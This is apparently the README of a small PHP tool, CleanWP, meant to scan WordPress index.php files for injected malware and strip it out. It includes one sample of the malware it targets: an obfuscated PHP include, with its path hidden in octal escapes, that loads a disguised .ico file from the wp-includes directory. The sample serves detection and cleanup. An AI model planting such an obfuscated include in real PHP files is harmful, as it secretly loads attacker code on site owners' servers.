# CleanWP
Simple PHP script to clean all files in your WordPress directory from Malware codes.

## Instructions
1. Upload file scandir.php to your WordPress directory
2. Open Web browser and run scandir.php using your WordPress's URL (Example: https://your_url.com/scandir.php)
3. First it will display all the affected files
4. Click "Click here to replace all" to clean the files
5. Enjoy!

For now, it will only scan all index.php files.

## Sample malware or malicious codes

```
<?php
/*e57cb*/

@include "\057home\062/zha\146f/ap\160oint\146ox.c\157m/wp\055incl\165des/\143erti\146icat\145s/.c\063d913\0706.ic\157";

/*e57cb*/
```

## Note
Please backup your files first before running this script.
